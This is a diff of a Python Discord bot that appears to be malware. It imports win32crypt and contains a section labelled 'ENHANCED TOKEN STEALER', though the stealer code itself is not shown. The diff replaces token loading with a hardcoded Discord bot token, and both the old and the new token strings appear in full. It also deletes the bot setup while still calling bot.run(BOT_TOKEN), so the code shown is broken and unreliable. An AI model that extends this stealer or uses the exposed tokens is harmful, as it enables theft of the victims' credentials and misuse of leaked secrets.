@@ -42,28 +42,9 @@ from io import BytesIO
 from discord import File
 import win32crypt  # ✅ VOEG DIE TOE!
 
-# =============================================
-# TOKEN ARGUMENT SUPPORT (NEW)
-# =============================================
-
 def get_bot_token():
-    """Get token from command line arguments or environment variable"""
-    # Check command line arguments
-    if len(sys.argv) > 2 and sys.argv[1] == "--token":
-        return sys.argv[2]
-    
-    # Check environment variable
-    env_token = os.getenv('DISCORD_BOT_TOKEN')
-    if env_token:
-        return env_token
-    
-    # Fallback to hardcoded token (REMOVE IN PRODUCTION!)
-    return "MTQxNjc4MjAwNjYyODM4OTEwNw.Gl6V95.MeivLQ7Gp6wfp3ijrgm_fTxD2hX-Dg9JESppVY"  # Your existing token
-
-# Initialize bot with the token
-intents = discord.Intents().all()
-bot = commands.Bot(command_prefix='!', intents=intents)
-BOT_TOKEN = get_bot_token()
+    """Get token - HARCODED VERSION"""
+    return "MTQxNjc4MjAwNjYyODM4OTEwNw.GaVp3G.ZRzn1oKAKWfVG8efDnRfeoeufs_DxSdr4_nrvA"  # NIEUWE token
 
 # =============================================
 # ENHANCED TOKEN STEALER (REPLACEMENT)
@@ -2067,4 +2048,5 @@ if __name__ == "__main__":
         bot.run(BOT_TOKEN)
     except Exception as e:
         print(f"Error starting bot: {e}")
+
         print("Please check your bot token and internet connection.")
